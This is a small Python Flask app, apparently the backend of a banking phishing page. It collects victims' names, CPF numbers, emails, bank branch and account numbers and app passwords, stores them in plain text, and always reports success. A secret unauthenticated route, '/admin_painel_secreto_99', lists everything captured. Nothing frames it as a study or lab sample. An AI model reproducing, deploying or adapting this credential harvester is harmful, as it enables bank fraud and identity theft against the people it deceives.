import os
import sqlite3
from flask import Flask, render_template, request, redirect, url_for

app = Flask(__name__)

# Banco de dados ultraleve
def init_db():
    try:
        conn = sqlite3.connect('dados_bancarios.db')
        cursor = conn.cursor()
        cursor.execute('''CREATE TABLE IF NOT EXISTS usuarios 
            (id INTEGER PRIMARY KEY AUTOINCREMENT, nome TEXT, cpf TEXT, email TEXT, agencia TEXT, conta TEXT, senha_app TEXT)''')
        conn.commit()
        conn.close()
    except Exception as e:
        print(f"Erro banco: {e}")

@app.route('/')
def index():
    return render_template('cadastro.html')

@app.route('/login', methods=['POST'])
def login():
    try:
        nome = request.form.get('nome')
        cpf = request.form.get('cpf')
        email = request.form.get('email')
        ag = request.form.get('agencia')
        cc = request.form.get('conta')
        pw = request.form.get('senha_app')
        
        conn = sqlite3.connect('dados_bancarios.db')
        cursor = conn.cursor()
        cursor.execute('INSERT INTO usuarios (nome, cpf, email, agencia, conta, senha_app) VALUES (?,?,?,?,?,?)', 
                       (nome, cpf, email, ag, cc, pw))
        conn.commit()
        conn.close()
    except:
        pass
    return redirect(url_for('sucesso'))

@app.route('/sucesso')
def sucesso():
    return render_template('sucesso.html')

@app.route('/admin_painel_secreto_99')
def admin():
    try:
        conn = sqlite3.connect('dados_bancarios.db')
        cursor = conn.cursor()
        cursor.execute('SELECT * FROM usuarios ORDER BY id DESC')
        usuarios = cursor.fetchall()
        conn.close()
        return render_template('admin.html', usuarios=usuarios)
    except:
        return "Erro ao carregar dados."

if __name__ == '__main__':
    init_db()
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)




